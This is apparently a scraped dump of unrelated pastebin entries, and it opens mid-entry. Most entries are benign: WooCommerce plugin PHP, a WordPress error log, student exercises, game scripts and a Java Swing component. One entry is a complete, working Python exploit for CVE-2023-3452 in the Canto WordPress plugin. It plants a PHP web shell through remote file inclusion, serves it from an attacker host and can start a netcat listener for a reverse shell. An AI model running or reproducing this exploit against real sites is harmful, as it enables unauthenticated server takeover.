function ceske_sluzby_ulozit_nastavene_cislo_objednavky( $order_id ) {
  $format_cisla = get_option( 'wc_ceske_sluzby_format_cisla_objednavky' );
  if ( ! empty( $format_cisla ) && $format_cisla == ""{DATE:Ymd}{SEQUENCE:d|2}"" ) {
    $last_order = get_option( 'ceske_sluzby_cislo_objednavky' );
    $actual_date = current_time( 'Ymd' );
    if ( ! empty( $last_order ) ) {
      $last_order_date = substr( $last_order, 0, 8 );
      $last_sequence = substr( $last_order, 8, 2 );
      $last_sequence_number = ltrim( $last_sequence, ""0"" );
      if ( $actual_date == $last_order_date ) {
        $sequence = $last_sequence_number + 1;
        $sequence = sprintf( '%02d', $sequence );
      } else {
        $sequence = sprintf( '%02d', 1 );
      }
    } else {
      $sequence = sprintf( '%02d', 1 );
    }
    $order_number = $actual_date . $sequence;
    update_post_meta( $order_id, '_ceske_sluzby_cislo_objednavky', $order_number );
    update_option( 'ceske_sluzby_cislo_objednavky', $order_number );
  }
};

add_filter( 'woocommerce_bacs_account_fields', 'ceske_sluzby_platba_predem_variabilni_symbol', 10, 2 );
function ceske_sluzby_platba_predem_variabilni_symbol( $account_fields, $order_id ) {
  $bacs_settings = get_option( 'woocommerce_bacs_settings' ); 
  if ( isset( $bacs_settings['ceske_sluzby_variabilni_symbol'] ) && $bacs_settings['ceske_sluzby_variabilni_symbol'] == ""yes"" ) {
    if ( isset( $account_fields['account_number']['value'] ) && ! empty( $account_fields['account_number']['value'] ) ) {
      $order = wc_get_order( $order_id );;
      $account_fields_new = array();
      foreach( $account_fields as $key => $value ) {
        $account_fields_new[$key] = $value;
        if ( $key === 'account_number' ) {
          $account_fields_new['variabilni-symbol'] = array(
            'label' => 'Variabilní symbol',
            'value' => $order->get_order_number()
          );
        }
      }
      return $account_fields_new;
    }
  }
  return $account_fields;
}
"
636b4REJ,LOG_WOO,laciikee,Apache Log,Friday 1st of March 2024 09:31:18 AM CDT,"2024-03-01T07:37:29+00:00 CRITICAL Uncaught Error: Failed opening required '/data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/ceske-sluzby-master/src/heureka/HeurekaOvereno.php' (include_path='.:/usr/share/php') in /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/ceske-sluzby-master/ceske-sluzby.php:51
Stack trace:
#0 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(326): ceske_sluzby_heureka_overeno_zakazniky(974123, Array)
#1 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters('', Array)
#2 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/plugin.php(517): WP_Hook->do_action(Array)
#3 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/woocommerce/includes/class-wc-checkout.php(1267): do_action('woocommerce_che...', 974123, Array, Object(Automattic\WooCommerce\Admin\Overrides\Order))
#4 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/woocommerce/includes/class-wc-ajax.php(508): WC_Checkout->process_checkout()
#5 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(324): WC_AJAX::checkout('')
#6 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters('', Array)
#7 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/plugin.php(517): WP_Hook->do_action(Array)
#8 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/woocommerce/includes/class-wc-ajax.php(96): do_action('wc_ajax_checkou...')
#9 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(324): WC_AJAX::do_wc_ajax('')
#10 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters(false, Array)
#11 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/plugin.php(517): WP_Hook->do_action(Array)
#12 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-includes/template-loader.php(13): do_action('template_redire...')
#13 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-blog-header.php(19): require_once('/data/0/4/04b8b...')
#14 /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/index.php(17): require('/data/0/4/04b8b...')
#15 {main}
  thrown v /data/0/4/04b8b7d7-4d7e-4330-8df2-e0531b41b210/detskyobchodik.sk/web/wp-content/plugins/ceske-sluzby-master/ceske-sluzby.php na riadku 51
"
HAJkeAb3,Тип №9. Задание №57416,Rakabidasta,Python,Friday 1st of March 2024 09:29:23 AM CDT,"f = """"""Тут строки из задания""""""
f = f.split(""\n"")
count = 0
for line in f:
    l = [int(x) for x in line.split(""\t"")]
    n = [l.count(number) for number in l]
    maxn = max(l)
    minn = min(l)
    vseost = sum(l) - maxn - minn
    if sum(n) == 5 and 2*(maxn+minn) <= vseost:
        count += 1
print(count)"
RjT6nBv7,LAB1_PNS_EX1,Bobita,C,Friday 1st of March 2024 09:26:44 AM CDT,"/*****************************************************************************
 * lab1.c
 *****************************************************************************/

#include <sys/platform.h>
#include ""adi_initialize.h""
#include ""lab1.h""
#include <cdefBF537.h>

/** 
 * If you want to use command program arguments, then place them in the following string. 
 */
char __argv_string[] = """";

/*[COD_EXPLICAT_LAB]:
//*pPORTFIO_DIR |= (1 << 6) | (1 << 7) | (1 << 8) | (1 << 9) | (1 << 10) | (1 << 11);
//*pPORTFIO |= (1 << 7);
//*pPORTFIO_INEN |= (1 << 2);
//	while(1){
//		if(*pPORTFIO & (1 << 2))
//		{
//			while(*pPORTFIO & (1 << 2));
//
//			*pPORTFIO |= (1 << 7);
//		}
//	}
 *
 * */


int main(int argc, char *argv[])
{
	/**
	 * Initialize managed drivers and/or services that have been added to
	 * the project.
	 * @return zero on success
	 */

	adi_initComponents();
	
	/* Begin adding your custom code here */
	*pPORTFIO_DIR |= (1 << 6) | (1 << 7) | (1 << 8) | (1 << 9) | (1 << 10) | (1 << 11);

	*pPORTFIO_INEN |= (1 << 2);

	*pPORTFIO |= (1 << 6);

	volatile unsigned int i;

	while(1)
	{
		for (i = 0; i < 99999999; i++);
		*pPORTFIO |= (1 << 6);
		for (i = 0; i < 9999; i++);
		*pPORTFIO &= ~(1 << 6);
	}
 	return 0;
}

"
J8jD31bJ,Untitled,goiaba123z,Pawn,Friday 1st of March 2024 09:25:32 AM CDT,"	CMD:cv(playerid, params[])
	{
		new CarroVip, Cor1, Cor2;
		if(!PlayerDados[playerid][Vip]) return SendClientMessage(playerid, -1, ""Voce precisa ser Vip para usar este comando!"");
		if(sscanf(params, ""iii"", CarroVip, Cor1, Cor2)) return SendClientMessage(playerid, -1, ""/cv [vehicleid] [cor1] [cor2]"");
		new Float:playerX, Float:playerY, Float:playerZ, Float:playerAngle;

		GetPlayerPos(playerid, playerX, playerY, playerZ);
    	GetPlayerFacingAngle(playerid, playerAngle);
		DestroyVehicle(CarroDono[playerid]);
		CarroDono[playerid] = CreateVehicle(CarroVip, playerX, playerY, playerZ, playerAngle, Cor1, Cor2, 1);
		PutPlayerInVehicle(playerid, CarroDono[playerid], 0);
		return 1;
	}"
tbLkFnvD,Cams Server,GarridoR10,Lua,Friday 1st of March 2024 09:25:28 AM CDT,"Config.SecurityCameras = {
    hideradar = false,
    cameras = {
        {label = ""Pacific Bank CAM#1"", coords = vec3(257.45, 210.07, 109.08), r = {x = -25.0, y = 0.0, z = 28.05}, canRotate = false, isOnline = true},
        {label = ""Pacific Bank CAM#2"", coords = vec3(232.86, 221.46, 107.83), r = {x = -25.0, y = 0.0, z = -140.91}, canRotate = false, isOnline = true},
        {label = ""Pacific Bank CAM#3"", coords = vec3(252.27, 225.52, 103.99), r = {x = -35.0, y = 0.0, z = -74.87}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd Grove St. CAM#1"", coords = vec3(-53.1433, -1746.714, 31.546), r = {x = -35.0, y = 0.0, z = -168.9182}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour Prosperity St. CAM#1"", coords = vec3(-1482.9, -380.463, 42.363), r = {x = -35.0, y = 0.0, z = 79.53281}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour San Andreas Ave. CAM#1"", coords = vec3(-1224.874, -911.094, 14.401), r = {x = -35.0, y = 0.0, z = -6.778894}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd Ginger St. CAM#1"", coords = vec3(-718.153, -909.211, 21.49), r = {x = -35.0, y = 0.0, z = -137.1431}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Innocence Blvd. CAM#1"", coords = vec3(23.885, -1342.441, 31.672), r = {x = -35.0, y = 0.0, z = -142.9191}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour El Rancho Blvd. CAM#1"", coords = vec3(1133.024, -978.712, 48.515), r = {x = -35.0, y = 0.0, z = -137.302}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd West Mirror Drive CAM#1"", coords = vec3(1151.93, -320.389, 71.33), r = {x = -35.0, y = 0.0, z = -119.4468}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Clinton Ave CAM#1"", coords = vec3(383.402, 328.915, 105.541), r = {x = -35.0, y = 0.0, z = 118.585}, canRotate = false, isOnline = true},
        {label = ""Limited Ltd Banham Canyon Dr CAM#1"", coords = vec3(-1832.057, 789.389, 140.436), r = {x = -35.0, y = 0.0, z = -91.481}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour Great Ocean Hwy CAM#1"", coords = vec3(-2966.15, 387.067, 17.393), r = {x = -35.0, y = 0.0, z = 32.92229}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Ineseno Road CAM#1"", coords = vec3(-3046.749, 592.491, 9.808), r = {x = -35.0, y = 0.0, z = -116.673}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Barbareno Rd. CAM#1"", coords = vec3(-3246.489, 1010.408, 14.705), r = {x = -35.0, y = 0.0, z = -135.2151}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Route 68 CAM#1"", coords = vec3(539.773, 2664.904, 44.056), r = {x = -35.0, y = 0.0, z = -42.947}, canRotate = false, isOnline = true},
        {label = ""Rob's Liqour Route 68 CAM#1"", coords = vec3(1169.855, 2711.493, 40.432), r = {x = -35.0, y = 0.0, z = 127.17}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Senora Fwy CAM#1"", coords = vec3(2673.579, 3281.265, 57.541), r = {x = -35.0, y = 0.0, z = -80.242}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Alhambra Dr. CAM#1"", coords = vec3(1966.24, 3749.545, 34.143), r = {x = -35.0, y = 0.0, z = 163.065}, canRotate = false, isOnline = true},
        {label = ""24/7 Supermarkt Senora Fwy CAM#2"", coords = vec3(1729.522, 6419.87, 37.262), r = {x = -35.0, y = 0.0, z = -160.089}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Hawick Ave CAM#1"", coords = vec3(309.341, -281.439, 55.88), r = {x = -35.0, y = 0.0, z = -146.1595}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Legion Square CAM#1"", coords = vec3(144.871, -1043.044, 31.017), r = {x = -35.0, y = 0.0, z = -143.9796}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Hawick Ave CAM#2"", coords = vec3(-355.7643, -52.506, 50.746), r = {x = -35.0, y = 0.0, z = -143.8711}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Del Perro Blvd CAM#1"", coords = vec3(-1214.226, -335.86, 39.515), r = {x = -35.0, y = 0.0, z = -97.862}, canRotate = false, isOnline = true},
        {label = ""Fleeca Bank Great Ocean Hwy CAM#1"", coords = vec3(-2958.885, 478.983, 17.406), r = {x = -35.0, y = 0.0, z = -34.69595}, canRotate = false, isOnline = true},
        {label = ""Paleto Bank CAM#1"", coords = vec3(-102.939, 6467.668, 33.424), r = {x = -35.0, y = 0.0, z = 24.66}, canRotate = false, isOnline = true},
        {label = ""Del Vecchio Liquor -- Paleto Bay"", coords = vec3(-163.75, 6323.45, 33.424), r = {x = -35.0, y = 0.0, z = 260.00}, canRotate = false, isOnline = true},
        {label = ""Don's Country Store -- Paleto Bay CAM#1"", coords = vec3(166.42, 6634.4, 33.69), r = {x = -35.0, y = 0.0, z = 32.00}, canRotate = false, isOnline = true},
        {label = ""Don's Country Store -- Paleto Bay CAM#2"", coords = vec3(163.74, 6644.34, 33.69), r = {x = -35.0, y = 0.0, z = 168.00}, canRotate = false, isOnline = true},
        {label = ""Don's Country Store -- Paleto Bay CAM#3"", coords = vec3(169.54, 6640.89, 33.69), r = {x = -35.0, y = 0.0, z = 5.78}, canRotate = false, isOnline = true},
        {label = ""Vangelico Jewelery CAM#1"", coords = vec3(-627.54, -239.74, 40.33), r = {x = -35.0, y = 0.0, z = 5.78}, canRotate = true, isOnline = true},
        {label = ""Vangelico Jewelery CAM#2"", coords = vec3(-627.51, -229.51, 40.24), r = {x = -35.0, y = 0.0, z = -95.78}, canRotate = true, isOnline = true},
        {label = ""Vangelico Jewelery CAM#3"", coords = vec3(-620.3, -224.31, 40.23), r = {x = -35.0, y = 0.0, z = 165.78}, canRotate = true, isOnline = true},
        {label = ""Vangelico Jewelery CAM#4"", coords = vec3(-622.57, -236.3, 40.31), r = {x = -35.0, y = 0.0, z = 5.78}, canRotate = true, isOnline = true},
        {label = ""Limited Ltd GrapeSeed CAM#1"", coords = vec3(1709.0, 4930.3, 44.00), r = {x = -25.0, y = 0.0, z = 98.0}, canRotate = false, isOnline = true},
        {label = ""24/7 Tataviam Mountains CAM#1"", coords = vec3(2558.8, 390.44, 110.8), r = {x = -25.0, y = 0.0, z = 140.0}, canRotate = false, isOnline = true},
        {label = ""Bobcat Entrada"", coords = vec3(914.0468, -2124.6125, 33.1238), r = {x = -25.0, y = 0.0, z = 37.6}, canRotate = false, isOnline = true},
        {label = ""Bobcat Corredor"", coords = vec3(900.1251, -2118.9685, 32.7513), r = {x = -25.0, y = 0.0, z = 153.5}, canRotate = false, isOnline = true},
        {label = ""Bobcat Cofre"", coords = vec3(886.1331, -2119.1904, 33.1385), r = {x = -25.0, y = 0.0, z = 195.35}, canRotate = false, isOnline = true},
        {label = ""Bobcat Corredor Trás"", coords = vec3(883.3436, -2112.6389, 33.1385), r = {x = -25.0, y = 0.0, z = 162.5}, canRotate = false, isOnline = true},
        {label = ""Bobcat Traseiras"", coords = vec3(892.5311, -2112.4558, 32.8785), r = {x = -25.0, y = 0.0, z = 44.1}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Legion Square"", coords = vec3(22.3243, -1107.5288, 32.5850), r = {x = -25.0, y = 0.0, z = 108.25}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Little Seoul"", coords = vec3(-666.1893, -943.9071, 24.2933), r = {x = -25.0, y = 0.0, z = 321.10}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Vespucci Boulevard"", coords = vec3(846.6937, -1025.0469, 30.6236), r = {x = -25.0, y = 0.0, z = 139.5}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Morning Wood"", coords = vec3(-1313.1063, -387.7838, 39.4933), r = {x = -25.0, y = 0.0, z = 215.5}, canRotate = false, isOnline = true},
        {label = ""Ammu-Nation Popular Street"", coords = vec3(809.3751, -2157.2720, 32.4005), r = {x = -25.0, y = 0.0, z = 310.6}, canRotate = false, isOnline = true},
    },
}
"
sfn9HkkG,Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion and Remote Code Execution - CVE-2023-3452,FlyFar,Python,Friday 1st of March 2024 08:59:18 AM CDT,"# Exploit Title: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
# Date: 04/11/2023
# Exploit Author: Leopoldo Angulo (leoanggal1)
# Vendor Homepage: https://wordpress.org/plugins/canto/
# Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip
# Version: All versions of Canto Plugin prior to 3.0.5
# Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4
# CVE : CVE-2023-3452

#PoC Notes:
#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)
#This code exploits the improper handling of the wp_abspath variable in the following line of the ""download.php"" code:
#... require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php'); ...
#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.
# More information in Leoanggal1's Github

#!/usr/bin/python3
import argparse
import http.server
import socketserver
import threading
import requests
import os
import subprocess

# Define the default web shell
default_web_shell = ""<?php system($_GET['cmd']); ?>""

def create_admin_file(local_dir, local_shell=None):
    if not os.path.exists(local_dir):
        os.makedirs(local_dir)

    # If a local shell is provided, use it; otherwise, use the default web shell
    if local_shell:
        with open(f""{local_dir}/admin.php"", ""wb"") as admin_file:
            with open(local_shell, ""rb"") as original_file:
                admin_file.write(original_file.read())
    else:
        with open(f""{local_dir}/admin.php"", ""w"") as admin_file:
            admin_file.write(default_web_shell)

def start_local_server(local_port):
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer((""0.0.0.0"", local_port), Handler)

    print(f""Local web server on port {local_port}..."")
    httpd.serve_forever()

    return httpd

def exploit_rfi(url, local_shell, local_host, local_port, command, nc_port):
    local_dir = ""wp-admin""
    create_admin_file(local_dir, local_shell)

    target_url = f""{url}/wp-content/plugins/canto/includes/lib/download.php""
    local_server = f""http://{local_host}:{local_port}""
    command = f""cmd={command}""

    if local_shell:
        # If a local shell is provided, start netcat on the specified port
        subprocess.Popen([""nc"", ""-lvp"", str(nc_port)])

    server_thread = threading.Thread(target=start_local_server, args=(local_port,))
    server_thread.daemon = True
    server_thread.start()

    exploit_url = f""{target_url}?wp_abspath={local_server}&{command}""
    print(f""Exploitation URL: {exploit_url}"")

    response = requests.get(exploit_url)
    print(""Server response:"")
    print(response.text)

    # Shutdown the local web server
    print(""Shutting down local web server..."")
    server_thread.join()

if __name__ == ""__main__"":
    examples = '''
    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33

    - Execute a command
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
    '''
    parser = argparse.ArgumentParser(description=""Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452"", epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument(""-u"", ""--url"", required=True, default=None,  help=""Vulnerable URL"")
    parser.add_argument(""-s"", ""--shell"", help=""Local file for web shell"")
    parser.add_argument(""-LHOST"", ""--local_host"", required=True, help=""Local web server IP"")
    parser.add_argument(""-LPORT"", ""--local_port"", help=""Local web server port"")
    parser.add_argument(""-c"", ""--command"", default=""whoami"", help=""Command to execute on the target"")
    parser.add_argument(""-NC_PORT"", ""--nc_port"", type=int, help=""Listener port for netcat"")

    try:
        args = parser.parse_args()

        if args.local_port is None:
            args.local_port = 8080  # Valor predeterminado si LPORT no se proporciona
        exploit_rfi(args.url, args.shell, args.local_host, int(args.local_port), args.command, args.nc_port)

    except SystemExit:
        parser.print_help()
            "
NZfkbZ2w,Big O notation,LEGEND2004,C++,Friday 1st of March 2024 08:40:04 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)
const int mod = 1e9 + 7;

signed main()
{
    fastio;
/*
    // O(1)
    int a , b;
    cin >> a >> b;
    cout << a + b;
    */
    /*
    // O(log n)
    int n , cnt = 0;
    cin >> n;
    while(n){
        cnt += (n % 2);
        n /= 2;
    }
    //cout << __builtin_popcount(n);
    cout << cnt;
    */
    /*
    // O(sqrt n)
    // 1 2 3 4 6 12
    // a * b = n
    // b = n / a
    int n , cnt = 0;
    cin >> n;
    vector<int> v;
    for(int i = 1; i * i <= n; i++){
        if(n % i)
            continue;
        cnt++;
        v.push_back(i);
        if(i * i != n){
            cnt++;
            v.push_back(n / i);
        }
    }
    sort(v.begin() , v.end());
    cout << cnt << '\n';;
    for(int i : v)
        cout << i << "" "";
    */
    /*
    // O(n)

    int n;
    cin >> n;
    int f = 1;
    for(int i = 1; i <= n; i++){
        f *= i;
        f %= mod;
    }
    cout << f;
    */
    /*
    // O(n  * log n)
    int n;
    cin >> n;
    vector<int> a(n);
    for(int i = 0; i < n; i++)
        cin >> a[i];

    sort(a.begin() , a.end()); // n logn

    for(int i : a)
        cout << i << "" "";
    */

    /*
    // O(n * n)
    int n;
    cin >> n;
    for(int i = 0; i < n; i++){
        for(int j = 0; j < n; j++){
            cout << i * n + j + 1 << "" "";
        }
        cout << '\n';
    }

    */
    /*
    // O(2 ^ n)
    int n , k = 1;
    cin >> n;
    // (1 << n) = 2 ^ n
    for(int i = 0; i < (1 << n); i++){

    }
    */
    /*
    // O(n!)
    int n;
    cin >> n;
    vector<int> v;
    for(int i = 1; i <= n; i++){
        v.push_back(i);
    }
    sort(v.begin() , v.end());
    do{
        for(int i : v)
            cout << i << "" "";
        cout << '\n';
    }while(next_permutation(v.begin() , v.end()));
    */
    

}"
uPw4DuDu,YanModDukun,PapiGemezs,PHP,Friday 1st of March 2024 08:18:15 AM CDT,"{
   ""Dukun"": [
      {
         ""version"": 1.4
      }
   ]
}"
UVFaCzLW,ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None],basedcount_bot,Python,Friday 1st of March 2024 08:17:16 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 992, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1112, in create_connection
    transport, protocol = await self._create_connection_transport(
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1145, in _create_connection_transport
    await waiter
ConnectionAbortedError: SSL handshake is taking longer than 60.0 seconds: aborting the connection

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 45, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 227, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 63, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1187, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 574, in _request
    conn = await self._connector.connect(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 544, in connect
    proto = await self._create_connection(req, traces, timeout)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 911, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1235, in _create_direct_connection
    raise last_exc
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1204, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1000, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None]
"
bJ2Ncatc,Review Pastebin Alternative,xxsa,PHP,Friday 1st of March 2024 08:09:11 AM CDT,https://pastes.io - Paste Tool - Pastebin Alternative since 2020
EAnpT8Ff,Untitled,h1n0t0r1,Python,Friday 1st of March 2024 08:01:09 AM CDT,"# Read user input
n = int(input())

# Logic
max_diff = 0
is_equal = True
previous_sum = 0

for i in range(n):
    first_num = int(input())
    second_num = int(input())
    pair_sum = first_num + second_num
    # On the first iteration we set min_sum, max_sum and pair_sum to first_num + second_num.
    if i == 0:
        previous_sum = pair_sum

    else:
        if pair_sum != previous_sum:
            diff = abs(previous_sum - pair_sum)
            if diff > max_diff:
                max_diff = diff
            is_equal = False
        previous_sum = pair_sum

if is_equal:
    print(f'Yes, value={pair_sum}')
else:
    print(f'No, maxdiff={max_diff}')"
pcDFJqEv,RCTurtle-Ars Nouveau Essence - ManualUpdate,untamemadman,Lua,Friday 1st of March 2024 07:49:55 AM CDT,"-- pastebin run pcDFJqEv

shell.run(""delete startup"")
shell.run(""pastebin get KUfFwFi5 startup"")
shell.run(""reboot"")"
yub3gYhp,View\CartaButtonPersonalizzato,aa91,Java,Friday 1st of March 2024 07:44:45 AM CDT,"package view;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

public class CartaPersonalizzataButton4Final extends JButton implements ActionListener {
    private int x;
    private int y;
    private String cartaVisualizzataPath;
    private String retroCartaVisualizzataPath;
    private int deltaX;
    private int deltaY;
    private int finalx;
    private int finaly;
    private BufferedImage frontCardImage;
    private BufferedImage backCardImage;
    private boolean revealing = false;
    private double scaleX = 1.0;

    private Timer timerMovimento;
    private Timer timerRotazione;

    public CartaPersonalizzataButton4Final(int x, int y, String cartaVisualizzataPath, String retroCartaVisualizzataPath) {
        this.x = x;
        this.y = y;
        this.cartaVisualizzataPath = cartaVisualizzataPath;
        this.retroCartaVisualizzataPath = retroCartaVisualizzataPath;
        timerMovimento = new Timer(10, this);
        timerRotazione = new Timer(10, this);

        setBounds(x, y, 77, 88);

        try {
            frontCardImage = ImageIO.read(new File(this.cartaVisualizzataPath));
            backCardImage = ImageIO.read(new File(this.retroCartaVisualizzataPath));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void actionPerformed(ActionEvent e) {

        //Effetto movimento
        if (e.getSource().equals(timerMovimento)) {

            if (x == finalx && y == finaly) {
                timerMovimento.stop();
            }

            if (x == finalx)
                deltaX = 0;

            if (y == finaly)
                deltaY = 0;

            if (x < finalx)
                x += deltaX;
            else
                x -= deltaX;

            if (y < finaly)
                y += deltaY;
            else
                y -= deltaY;

            this.setLocation(x, y);
//            this.setBounds(x, y, 77, 88);
        }

        //Effetto rotazione
        if (e.getSource().equals(timerRotazione)) {
            scaleX -= 0.07;

            if (scaleX <= 0 && !revealing) {
                scaleX = 0;
                revealing = true; // Inizia a rivelare la carta sottostante
                timerRotazione.setDelay(20); // Riduci la velocità di rivelazione
            } else if (scaleX <= -1.0 && revealing) {
                scaleX = -1.0;
                timerRotazione.stop();
            }
        }
        repaint();
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);

        // Disegna la carta frontale (superiore)
        Graphics2D g2d = (Graphics2D) g.create();

        int centerX = getWidth() / 2; // Calcola il centro orizzontale
        int centerY = getHeight() / 2; // Calcola il centro verticale

        g2d.translate(centerX, centerY); // Trasla all'origine
        g2d.scale(scaleX, 1.0); // Scala sull'asse X

        if (!revealing)
            g2d.drawImage(frontCardImage, -frontCardImage.getWidth() / 2, -frontCardImage.getHeight() / 2, null);
        else
            g2d.drawImage(backCardImage, frontCardImage.getWidth(null) / 2, -backCardImage.getHeight(null) / 2, -backCardImage.getWidth(null), backCardImage.getHeight(null), null);

        g2d.dispose();
    }

//    @Override
//    protected void paintComponent(Graphics g) {
//        super.paintComponent(g);
//
